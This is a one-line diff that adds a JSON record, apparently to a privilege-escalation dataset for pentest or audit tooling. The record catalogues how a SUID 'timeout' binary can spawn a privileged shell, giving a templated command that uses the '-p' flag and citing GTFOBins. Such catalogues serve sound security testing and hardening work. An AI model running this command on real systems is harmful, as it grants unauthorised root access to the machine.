@@ -1,0 +1,1 @@
+{"id":"suid_timeout","category":"SUID_GTFOBINS","binary":"timeout","cve":null,"exploitation":["{{binary}} 7d {{shell}} -p"],"post_exploit":["id"],"source":"gtfobins.github.io","tags":["suid","gtfobins"],"severity":"high"}
